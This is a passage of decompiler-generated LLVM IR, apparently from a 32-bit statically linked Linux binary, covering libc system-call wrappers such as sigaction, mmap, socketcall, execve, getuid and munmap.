  %v5_805177a = mul i32 %v4_805177a47, 4
  %v6_805177a = add i32 %v5_805177a, ptrtoint (i32* @global_var_8059128.258 to i32)
  %v7_805177a = inttoptr i32 %v6_805177a to i32*
  %v8_805177a = load i32, i32* %v7_805177a, align 4
  call void @__pseudo_call(i32 %v8_805177a)
  %v0_8051781 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051781 = add i32 %v0_8051781, 1
  store i32 %v1_8051781, i32* %ebx.global-to-local, align 4
  %v1_8051782.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8051782 = icmp ult i32 %v1_8051781, %v1_8051782.pre
  br i1 %v7_8051782, label %dec_label_pc_805177a, label %dec_label_pc_8051786

dec_label_pc_8051786:                             ; preds = %dec_label_pc_805177a, %dec_label_pc_8051755
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582568), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582568), i32 2), i32 0), label %dec_label_pc_805179e, label %dec_label_pc_80517aa

dec_label_pc_805179e:                             ; preds = %dec_label_pc_8051786, %dec_label_pc_805179e
  %v4_805179e44 = phi i32 [ %v1_80517a5, %dec_label_pc_805179e ], [ 0, %dec_label_pc_8051786 ]
  store i32 ptrtoint (i32* @global_var_80517a5.267 to i32), i32* %stack_var_-168, align 4
  %v5_805179e = mul i32 %v4_805179e44, 4
  %v6_805179e = add i32 %v5_805179e, ptrtoint (i32* @global_var_8059128.258 to i32)
  %v7_805179e = inttoptr i32 %v6_805179e to i32*
  %v8_805179e = load i32, i32* %v7_805179e, align 4
  call void @__pseudo_call(i32 %v8_805179e)
  %v0_80517a5 = load i32, i32* @ebx, align 4
  %v1_80517a5 = add i32 %v0_80517a5, 1
  store i32 %v1_80517a5, i32* @ebx, align 4
  %v1_80517a6.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_80517a6 = icmp ult i32 %v1_80517a5, %v1_80517a6.pre
  br i1 %v7_80517a6, label %dec_label_pc_805179e, label %dec_label_pc_80517aa

dec_label_pc_80517aa:                             ; preds = %dec_label_pc_805179e, %dec_label_pc_8051786
  %v0_80517b3 = load i32, i32* %stack_var_-168, align 4
  %v1_80517b3 = call i32 @__errno_location(i32 %v0_80517b3)
  %v1_80517b8 = inttoptr i32 %v1_80517b3 to i32*
  store i32 0, i32* %v1_80517b8, align 4
  %v0_80517c7 = call i32 @__GI___h_errno_location()
  store i32 %v0_80517c7, i32* @eax, align 4
  %v1_80517cc = inttoptr i32 %v0_80517c7 to i32*
  store i32 0, i32* %v1_80517cc, align 4
  %v0_80517d9 = load i32, i32* @edi, align 4
  store i32 %v0_80517d9, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_80517e8 = load i32, i32* @eax, align 4
  %v1_80517eb = call i32 @__GI_exit(i32 %v0_80517e8)
  %v0_80517f5 = load i32, i32* @ebx, align 4
  %v1_80517f5 = inttoptr i32 %v0_80517f5 to %sigcontext*
  %v2_80517f5 = call i32 @sigreturn(%sigcontext* %v1_80517f5)
  %v0_80517fd = load i32, i32* @ebx, align 4
  %v1_80517fd = inttoptr i32 %v0_80517fd to %sigcontext*
  %v2_80517fd = call i32 @sigreturn(%sigcontext* %v1_80517fd)
  ret i32 %v2_80517fd

; uselistorder directives
  uselistorder i32 %v1_80517a5, { 1, 2, 0 }
  uselistorder i32 %v1_8051781, { 1, 2, 0 }
  uselistorder i32 %v2_80516c1, { 1, 0 }
  uselistorder i32 %v1_80516be, { 2, 1, 0 }
  uselistorder i32 %v1_805169d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805169a, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 3, 4, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582568), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582568), { 0, 2, 1 }
  uselistorder i32 ()* @__check_one_fd, { 1, 0, 2 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 4096, { 16, 17, 4, 15, 11, 12, 0, 1, 5, 13, 10, 14, 9, 6, 3, 7, 2, 8 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_805179e, { 1, 0 }
  uselistorder label %dec_label_pc_805177a, { 1, 0 }
  uselistorder label %dec_label_pc_8051755, { 1, 0 }
  uselistorder label %dec_label_pc_80516e0, { 1, 0 }
  uselistorder label %dec_label_pc_80516be, { 1, 0 }
  uselistorder label %dec_label_pc_80516a6, { 1, 0 }
  uselistorder label %dec_label_pc_8051683, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_80517ff = load i32, i32* @esi, align 4
  %v0_8051800 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051815 = icmp eq i32* %arg2, null
  br i1 %v1_8051815, label %dec_label_pc_8051868, label %dec_label_pc_8051819

dec_label_pc_8051819:                             ; preds = %entry
  %v2_8051819 = load i32, i32* %arg2, align 4
  store i32 %v2_8051819, i32* %stack_var_-148, align 4
  %v1_8051822 = add i32 %tmp11, 4
  %v3_8051834 = bitcast i32* %stack_var_-136 to i16*
  %v4_8051834 = call i32 @memcpy(i16* %v3_8051834, i32 %v1_8051822, i32 128)
  %v1_8051839 = add i32 %tmp11, 132
  %v2_8051853 = inttoptr i32 %v1_8051839 to i8*
  %v3_8051853 = load i8, i8* %v2_8051853, align 1
  %v4_8051853 = and i8 %v3_8051853, 4
  %v5_8051853 = icmp eq i8 %v4_8051853, 0
  %v1_805185a = icmp eq i1 %v5_8051853, false
  br i1 %v1_805185a, label %dec_label_pc_8051868, label %dec_label_pc_805185c

dec_label_pc_805185c:                             ; preds = %dec_label_pc_8051819
  br label %dec_label_pc_8051868

dec_label_pc_8051868:                             ; preds = %dec_label_pc_805185c, %dec_label_pc_8051819, %entry
  %v1_805186a = icmp eq i32 %arg3, 0
  br i1 %v1_805186a, label %dec_label_pc_8051872, label %dec_label_pc_805186e

dec_label_pc_805186e:                             ; preds = %dec_label_pc_8051868
  %v2_805186e = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8051872

dec_label_pc_8051872:                             ; preds = %dec_label_pc_8051868, %dec_label_pc_805186e
  %v0_8051881 = phi i32 [ 0, %dec_label_pc_8051868 ], [ %v2_805186e, %dec_label_pc_805186e ]
  br i1 %v1_8051815, label %dec_label_pc_805187f, label %dec_label_pc_8051878

dec_label_pc_8051878:                             ; preds = %dec_label_pc_8051872
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805187f

dec_label_pc_805187f:                             ; preds = %dec_label_pc_8051872, %dec_label_pc_8051878
  %v0_8051882 = phi %sigaction* [ null, %dec_label_pc_8051872 ], [ %phitmp, %dec_label_pc_8051878 ]
  %v5_805188a = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8051882, i32 %v0_8051881, i32 8)
  store i32 %v5_805188a, i32* %ebx.global-to-local, align 4
  br i1 %v1_805186a, label %dec_label_pc_80518cd, label %dec_label_pc_8051898

dec_label_pc_8051898:                             ; preds = %dec_label_pc_805187f
  %v2_8051898 = icmp slt i32 %v5_805188a, 0
  br i1 %v2_8051898, label %dec_label_pc_80518cd, label %dec_label_pc_805189c

dec_label_pc_805189c:                             ; preds = %dec_label_pc_8051898
  %v3_805189c = load i32, i32* %stack_var_-288, align 4
  %v2_80518a0 = inttoptr i32 %arg3 to i32*
  store i32 %v3_805189c, i32* %v2_80518a0, align 4
  %v2_80518a8 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80518ad = add i32 %arg3, 4
  %v3_80518b1 = inttoptr i32 %v1_80518ad to i16*
  %v4_80518b1 = call i32 @memcpy(i16* %v3_80518b1, i32 %v2_80518a8, i32 128)
  %v2_80518ba = add i32 %arg3, 132
  %v3_80518ba = inttoptr i32 %v2_80518ba to i32*
  %v2_80518c7 = add i32 %arg3, 136
  %v3_80518c7 = inttoptr i32 %v2_80518c7 to i32*
  %v0_80518cd.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80518cd

dec_label_pc_80518cd:                             ; preds = %dec_label_pc_8051898, %dec_label_pc_805187f, %dec_label_pc_805189c
  %v0_80518cd = phi i32 [ %v5_805188a, %dec_label_pc_8051898 ], [ %v5_805188a, %dec_label_pc_805187f ], [ %v0_80518cd.pre, %dec_label_pc_805189c ]
  store i32 %v0_8051800, i32* @ebx, align 4
  store i32 %v0_80517ff, i32* @esi, align 4
  ret i32 %v0_80518cd

; uselistorder directives
  uselistorder i1 %v1_805186a, { 1, 0 }
  uselistorder i1 %v1_8051815, { 1, 0 }
  uselistorder i32* null, { 1, 5, 2, 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 16, 3, 4 }
  uselistorder i32 %arg3, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_80518cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805187f, { 1, 0 }
  uselistorder label %dec_label_pc_8051872, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_80518db = load i32, i32* @eax, align 4
  %v1_80518dd = sub i32 0, %v0_80518db
  %v1_80518df = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_80518e4 = inttoptr i32 %v1_80518df to i32*
  store i32 %v1_80518dd, i32* %v2_80518e4, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_80518f0 = load i32, i32* @ebx, align 4
  %v2_80518f7 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_80518f7, i32* @ebx, align 4
  %v8_80518fb = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_80518f0, i32* @ebx, align 4
  %v3_8051904 = icmp ugt i32 %v8_80518fb, -4096
  call void @__pseudo_cond_branch(i1 %v3_8051904, i32 134551768)
  ret i32 %v8_80518fb

; uselistorder directives
  uselistorder i32 %v8_80518fb, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134551768, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805190c = load i32, i32* @ebx, align 4
  store i32 %v0_805190c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805191f = call i32 @int80_syscall(i32 102)
  store i32 %v1_805191f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_805191f, -4095
  br i1 %tmp8, label %dec_label_pc_8051938, label %dec_label_pc_805192c

dec_label_pc_805192c:                             ; preds = %entry
  %v0_805192c = load i32, i32* %stack_var_-4, align 4
  %v1_805192c = call i32 @__errno_location(i32 %v0_805192c)
  %v0_8051931 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051931 = sub i32 0, %v0_8051931
  %v2_8051933 = inttoptr i32 %v1_805192c to i32*
  store i32 %v1_8051931, i32* %v2_8051933, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051938

dec_label_pc_8051938:                             ; preds = %entry, %dec_label_pc_805192c
  %v0_8051938 = phi i32 [ %v1_805191f, %entry ], [ -1, %dec_label_pc_805192c ]
  %v2_805193a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805193a, i32* @edx, align 4
  %v2_805193c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805193c, i32* @ebx, align 4
  ret i32 %v0_8051938

; uselistorder directives
  uselistorder i32 %v1_805191f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051938, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051941 = load i32, i32* @esi, align 4
  store i32 %v0_8051941, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051955 = load i32, i32* @ebx, align 4
  %v7_805195d = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805195d, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_805195d, -4095
  br i1 %tmp13, label %dec_label_pc_8051975, label %dec_label_pc_8051969

dec_label_pc_8051969:                             ; preds = %entry
  %v1_8051969 = call i32 @__errno_location(i32 %v0_8051955)
  %v0_805196e = load i32, i32* %esi.global-to-local, align 4
  %v1_805196e = sub i32 0, %v0_805196e
  %v2_8051970 = inttoptr i32 %v1_8051969 to i32*
  store i32 %v1_805196e, i32* %v2_8051970, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051975

dec_label_pc_8051975:                             ; preds = %entry, %dec_label_pc_8051969
  %v0_8051975 = phi i32 [ %v7_805195d, %entry ], [ -1, %dec_label_pc_8051969 ]
  %v2_8051978 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051978, i32* @esi, align 4
  ret i32 %v0_8051975

; uselistorder directives
  uselistorder i32 %v7_805195d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051975, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805197c = load i32, i32* @ebx, align 4
  store i32 %v0_805197c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805198f = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_805198f, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_805198f, -4095
  br i1 %tmp9, label %dec_label_pc_80519a8, label %dec_label_pc_805199c

dec_label_pc_805199c:                             ; preds = %entry
  %v0_805199c = load i32, i32* %stack_var_-4, align 4
  %v1_805199c = call i32 @__errno_location(i32 %v0_805199c)
  %v0_80519a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80519a1 = sub i32 0, %v0_80519a1
  %v2_80519a3 = inttoptr i32 %v1_805199c to i32*
  store i32 %v1_80519a1, i32* %v2_80519a3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80519a8

dec_label_pc_80519a8:                             ; preds = %entry, %dec_label_pc_805199c
  %v0_80519a8 = phi i32 [ %v4_805198f, %entry ], [ -1, %dec_label_pc_805199c ]
  %v2_80519aa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80519aa, i32* @edx, align 4
  %v2_80519ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80519ac, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80519a8

; uselistorder directives
  uselistorder i32 %v4_805198f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80519a8, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_80519b0 = load i32, i32* @edi, align 4
  store i32 %v0_80519b0, i32* %stack_var_-4, align 4
  %v4_80519b4 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80519b4, i32* %edi.global-to-local, align 4
  %v0_80519c0 = load i32, i32* @ebx, align 4
  %v5_80519c8 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80519c8 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80519c8 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80519c8, [1 x i8*] %v8_80519c8)
  store i32 %v9_80519c8, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80519c8, -4095
  br i1 %tmp12, label %dec_label_pc_80519e0, label %dec_label_pc_80519d4

dec_label_pc_80519d4:                             ; preds = %entry
  %v1_80519d4 = call i32 @__errno_location(i32 %v0_80519c0)
  %v0_80519d9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80519d9 = sub i32 0, %v0_80519d9
  %v2_80519db = inttoptr i32 %v1_80519d4 to i32*
  store i32 %v1_80519d9, i32* %v2_80519db, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80519e0

dec_label_pc_80519e0:                             ; preds = %entry, %dec_label_pc_80519d4
  %v0_80519e0 = phi i32 [ %v9_80519c8, %entry ], [ -1, %dec_label_pc_80519d4 ]
  %v2_80519e4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80519e4, i32* %edi.global-to-local, align 4
  ret i32 %v0_80519e0

; uselistorder directives
  uselistorder i32 %v9_80519c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80519e0, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80519e8 = load i32, i32* @ebx, align 4
  store i32 %v0_80519e8, i32* %stack_var_-4, align 4
  %v1_80519f1 = call i32 @int80_syscall(i32 202)
  store i32 %v1_80519f1, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80519f1, -4095
  br i1 %tmp6, label %dec_label_pc_8051a08, label %dec_label_pc_80519fc

dec_label_pc_80519fc:                             ; preds = %entry
  %v0_80519fc = load i32, i32* %stack_var_-4, align 4
  %v1_80519fc = call i32 @__errno_location(i32 %v0_80519fc)
  %v0_8051a01 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a01 = sub i32 0, %v0_8051a01
  %v2_8051a03 = inttoptr i32 %v1_80519fc to i32*
  store i32 %v1_8051a01, i32* %v2_8051a03, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a08

dec_label_pc_8051a08:                             ; preds = %entry, %dec_label_pc_80519fc
  %v0_8051a08 = phi i32 [ %v1_80519f1, %entry ], [ -1, %dec_label_pc_80519fc ]
  %v2_8051a0c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051a0c, i32* @ebx, align 4
  ret i32 %v0_8051a08

; uselistorder directives
  uselistorder i32 %v1_80519f1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051a08, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a10 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a10, i32* %stack_var_-4, align 4
  %v1_8051a19 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051a19, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051a19, -4095
  br i1 %tmp6, label %dec_label_pc_8051a30, label %dec_label_pc_8051a24

dec_label_pc_8051a24:                             ; preds = %entry
  %v0_8051a24 = load i32, i32* %stack_var_-4, align 4
  %v1_8051a24 = call i32 @__errno_location(i32 %v0_8051a24)
  %v0_8051a29 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a29 = sub i32 0, %v0_8051a29
  %v2_8051a2b = inttoptr i32 %v1_8051a24 to i32*
  store i32 %v1_8051a29, i32* %v2_8051a2b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a30

dec_label_pc_8051a30:                             ; preds = %entry, %dec_label_pc_8051a24
  %v0_8051a30 = phi i32 [ %v1_8051a19, %entry ], [ -1, %dec_label_pc_8051a24 ]
  %v2_8051a34 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051a34, i32* @ebx, align 4
  ret i32 %v0_8051a30

; uselistorder directives
  uselistorder i32 %v1_8051a19, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051a30, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a38 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a38, i32* %stack_var_-4, align 4
  %v1_8051a41 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051a41, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051a41, -4095
  br i1 %tmp6, label %dec_label_pc_8051a58, label %dec_label_pc_8051a4c

dec_label_pc_8051a4c:                             ; preds = %entry
  %v0_8051a4c = load i32, i32* %stack_var_-4, align 4
  %v1_8051a4c = call i32 @__errno_location(i32 %v0_8051a4c)
  %v0_8051a51 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a51 = sub i32 0, %v0_8051a51
  %v2_8051a53 = inttoptr i32 %v1_8051a4c to i32*
  store i32 %v1_8051a51, i32* %v2_8051a53, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a58

dec_label_pc_8051a58:                             ; preds = %entry, %dec_label_pc_8051a4c
  %v0_8051a58 = phi i32 [ %v1_8051a41, %entry ], [ -1, %dec_label_pc_8051a4c ]
  %v2_8051a5c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051a5c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051a58

; uselistorder directives
  uselistorder i32 %v1_8051a41, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051a58, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a60 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a60, i32* %stack_var_-4, align 4
  %v1_8051a69 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8051a69, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051a69, -4095
  br i1 %tmp6, label %dec_label_pc_8051a80, label %dec_label_pc_8051a74

dec_label_pc_8051a74:                             ; preds = %entry
  %v0_8051a74 = load i32, i32* %stack_var_-4, align 4
  %v1_8051a74 = call i32 @__errno_location(i32 %v0_8051a74)
  %v0_8051a79 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a79 = sub i32 0, %v0_8051a79
  %v2_8051a7b = inttoptr i32 %v1_8051a74 to i32*
  store i32 %v1_8051a79, i32* %v2_8051a7b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a80

dec_label_pc_8051a80:                             ; preds = %entry, %dec_label_pc_8051a74
  %v0_8051a80 = phi i32 [ %v1_8051a69, %entry ], [ -1, %dec_label_pc_8051a74 ]
  %v2_8051a84 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051a84, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051a80

; uselistorder directives
  uselistorder i32 %v1_8051a69, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051a80, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051a88 = load i32, i32* @edi, align 4
  %v0_8051a89 = load i32, i32* @esi, align 4
  store i32 %v0_8051a89, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8051aa1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8051aa9 = call i32 @mremap(i32 %v0_8051aa1, i32 %v0_8051a89, i32 %v0_8051a88, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8051aa1, i32* @ebx, align 4
  store i32 %v6_8051aa9, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8051aa9, -4095
  br i1 %tmp11, label %dec_label_pc_8051ac1, label %dec_label_pc_8051ab5

dec_label_pc_8051ab5:                             ; preds = %entry
  %v1_8051ab5 = call i32 @__errno_location(i32 %v0_8051aa1)
  %v0_8051aba = load i32, i32* %esi.global-to-local, align 4
  %v1_8051aba = sub i32 0, %v0_8051aba
  %v2_8051abc = inttoptr i32 %v1_8051ab5 to i32*
  store i32 %v1_8051aba, i32* %v2_8051abc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051ac1

dec_label_pc_8051ac1:                             ; preds = %entry, %dec_label_pc_8051ab5
  %v0_8051ac1 = phi i32 [ %v6_8051aa9, %entry ], [ -1, %dec_label_pc_8051ab5 ]
  %v2_8051ac3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051ac3, i32* @edx, align 4
  %v2_8051ac4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051ac4, i32* @esi, align 4
  store i32 %v0_8051a88, i32* @edi, align 4
  ret i32 %v0_8051ac1

; uselistorder directives
  uselistorder i32 %v6_8051aa9, { 1, 0, 2 }
  uselistorder i32 %v0_8051aa1, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ac1, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ac8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ac8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8051adb = call i32 @munmap(i32 %v0_8051ac8, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8051adb, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_8051adb, -4095
  br i1 %tmp8, label %dec_label_pc_8051af4, label %dec_label_pc_8051ae8

dec_label_pc_8051ae8:                             ; preds = %entry
  %v0_8051ae8 = load i32, i32* %stack_var_-4, align 4
  %v1_8051ae8 = call i32 @__errno_location(i32 %v0_8051ae8)
  %v0_8051aed = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051aed = sub i32 0, %v0_8051aed
  %v2_8051aef = inttoptr i32 %v1_8051ae8 to i32*
  store i32 %v1_8051aed, i32* %v2_8051aef, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051af4

dec_label_pc_8051af4:                             ; preds = %entry, %dec_label_pc_8051ae8
  %v0_8051af4 = phi i32 [ %v4_8051adb, %entry ], [ -1, %dec_label_pc_8051ae8 ]
  %v2_8051af6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051af6, i32* @edx, align 4
  %v2_8051af8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051af8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051af4

; uselistorder directives
  uselistorder i32 %v4_8051adb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051af4, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_8051afc = load i32, i32* @ebx, align 4
  store i32 %v0_8051afc, i32* %stack_var_-4, align 4
  %v4_8051b00 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8051b00, i32* %ebx.global-to-local, align 4
